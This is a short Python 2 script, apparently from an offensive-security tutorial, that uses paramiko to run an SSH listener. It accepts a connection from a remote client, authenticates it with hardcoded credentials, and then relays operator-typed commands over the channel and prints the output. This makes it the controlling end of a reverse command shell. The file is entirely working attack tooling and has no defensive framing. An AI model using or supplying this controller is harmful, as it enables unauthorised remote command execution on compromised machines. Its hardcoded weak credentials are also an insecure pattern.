# -*- encoding: utf-8 -*-


import socket
import paramiko
import threading
import sys


#host_key = paramiko.RSAKey( filename='/home/unknown/.ssh/id_rsa.pub' )
host_key = paramiko.RSAKey(filename='test_rsa.key')


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()


    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED

        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED


    def check_auth_password(self, user, passwd):
        if (user == 'username') and (passwd == 'passwd'):
            return paramiko.AUTH_SUCCESSFUL

        return paramiko.AUTH_FAILED


server = sys.argv[1]
ssh_port = int(sys.argv[2])


try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)

    print '[*] LISTENING FOR CONNECTION ... '

    client, addr = sock.accept()
except Exception as err:
    print '[!!] LISTEN FAILED: ' + str(err)
    sys.exit(1)


print '[*] GOT A CONNECTION !!! '


try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)

    server = Server()

    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException, x:
        print '[!!] SSH NEGOTIATION FAILED'
    
    chan = bhSession.accept(20)
    
    print '[*] AUTENTICATED'
    print chan.recv(1024)

    chan.send('[*] WELLCOME : ) ')

    while True:
        try:
            cmd = raw_input('Enter command').strip('\n')

            if cmd != 'exit':
                chan.send(cmd)
                print chan.recv(1024) + '\n'
            else:
                chan.send('exit')

                print '[!!] EXITING'

                bhSession.close()

                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()

except Exception, err:
    print '[!!] CAUGHT EXCEPTION --> ' + str(err)

    try:
        bhSession.close()
    except:
        pass

    sys.exit(1)
